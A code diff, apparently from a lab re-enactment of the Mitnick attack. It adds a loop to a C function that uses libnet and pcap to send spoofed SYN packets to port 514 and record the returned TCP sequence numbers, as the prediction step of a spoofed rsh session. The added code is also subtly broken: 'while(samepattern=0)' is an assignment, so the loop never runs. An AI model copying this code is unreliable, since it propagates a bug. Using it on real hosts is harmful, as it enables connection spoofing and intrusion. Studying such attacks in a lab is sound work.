@@ -91,10 +91,38 @@ uint32_t getNextSeq(libnet_t *l,u_long kevin, u_long xterminal, u_int32_t sport,
    
     const struct tcphdr* tcp;
     int status;
-    uint32_t seq[2];
+    int samepattern=0;
+    uint32_t seq[3];
     tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)123456,(u_int32_t)1,NULL,0,TH_SYN);
     ipTagCreate(l,(u_int32_t)kevin,(u_int32_t)xterminal,NULL,(u_int32_t)0);
-    
+
+    while(samepattern=0)
+    {   
+        for(int i=0; i<3;i++)
+        {
+            sendPacket(l);
+
+            //Read packet
+            status = pcap_next_ex(des, &header, &packet);
+                
+            //Check the result of the reading
+            if (status < 0) {
+                fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(des));
+                exit(1);
+            }
+
+            //struct ethernet *ethernet=(struct ethernet *)(packet);
+            //struct ip *ip=(struct ip *)(packet + 14);
+
+            //Retrieve tcp header
+            tcp=(const struct tcphdr *)(packet +14+sizeof(struct ip));
+            //Save seq retrieved
+            seq[i] =ntohl(tcp->th_seq);
+
+        }
+        if((seq[2]-seq[1])==(seq[1]-seq[0]+11111111))
+            samepattern=1;
+    }
     for(int i=0; i<2;i++)
     {
         //Send SYN packet
